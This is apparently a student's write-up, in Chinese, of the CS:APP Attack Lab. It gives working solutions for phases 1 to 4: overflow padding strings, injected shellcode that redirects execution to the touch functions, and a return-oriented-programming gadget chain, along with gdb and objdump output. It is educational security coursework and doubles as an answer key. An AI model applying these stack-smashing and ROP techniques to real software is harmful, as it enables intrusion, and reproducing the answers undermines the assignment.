## Prepration
实验目的：
1、了解缓冲区溢出（stack discipline）
2、write code away from stack discipline
文件结构：
CSAPP-AttackLab
	AttackLab.md
	target1
		cookie.txt 一个8位16进制数，作为攻击的特殊标志符
		ctarget 代码注入攻击的目标文件
		farm.c 在ROP攻击中作为gadgets产生源
		hex2raw 将16进制数转化为攻击字符
		README.txt
		rtarget ROP攻击的目标文件
实验环境：
Centos8-Linux

# Phase1

objdump -d ./ctarget>>ctarget.s //反汇编
![](../imgs/Pasted image 20240620171305.png)
CI: run getbuf return to touch1 adress, touch1 adress : 0x4017c0
getbuf有40个字节的栈空间，所以注入代码应填为:
phase1_ans.txt:
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	c0 17 40 00 00 00 00 00

--------------------------

# Phase2

![](../imgs/Pasted image 20240621112009.png) 

思路关键：在getbuf中给%rdi赋值cookie.txt中的0x59b997fa

```cpp
// in phase2.s
movq $0x59b997fa,%rdi
pushq  $0x4017ec
ret

gcc -c phase2.s -o phase2.o 
objdump -d phase2.o >phase2.txt 

// in phase2.txt

phase2.o：     文件格式 elf64-x86-64
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   9:	68 ec 17 40 00       	pushq  $0x4017ec
   e:	c3                   	retq   
```
因此，结合phase1进行缓存区溢出，即溢出区域地址返回到想要插入的%rsp地址，观察getbuf函数的代码，可知应在mov %rsp,%rdi后加入攻击代码，即<Gets>之前

![](../imgs/微信截图_20240621125123.png) 

通过gdb调试日志查询得到<Gets>时的$rsp值：

```
gdb ctarget
b getbuf
run -q
disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
=> 0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
(gdb) p /x $rsp
$1 = 0x5561dc78
```

因此注入代码答案为：

48 c7 c7 fa 97 b9 59 68
ec 17 40 c3 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

# Phase3

![](../imgs/微信截图_20240624163459.png) 

man ascii,

cookie: 59b997fa

str -> Hex: 

35 39 62 39 39 37 66 61

<test> -> $rsp: 0x5561dca8, 我们将字符串放在这里，保证getbuf里面的函数不覆盖字符串

disas touch3 -> touch3跳转地址为：0x4018fa

````
vim phase3.txt：

```
movq $0x59b997fa,%rdi

pushq  $0x4017ec

ret
```

gcc -c phase3.s -o phase3.o 
objdump -d phase3.o >phase3.txt 

phase3.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
````

因此注入代码答案为：

48 c7 c7 a8 dc 61 55 00 //0x5561dc78, 注入代码，将字符串赋值给$rdi
fa 18 40 00 c3 00 00 00 // pushq $0x4018fa, 赋值%rsp，跳转touch3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 //0x5561dca0, 跳转到<Get>前
35 39 62 39 39 37 66 61 //0x5561dca8, 存储的字符串hex码

# Phase4

![](../imgs/微信截图_20240625161014.png) 

![image-20240625163114528](../imgs/image-20240625163114528.png)

```
objdump -d ./rtarget > rtarget.s
```

![image-20240625162404276](../imgs/image-20240625162404276.png) -> 0x4019ab

![image-20240625162827974](../imgs/image-20240625162827974.png) -> 0x4019a2

Talk is cheap, show me the code:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 //跳转执行0x4019ab: popq %rax; req
fa 97 b9 59 00 00 00 00 // %rsp: cookie
a2 19 40 00 00 00 00 00 //跳转执行0x4019a2: movq %rax,%rdi; req
ec 17 40 00 00 00 00 00 //跳转到touch2
```

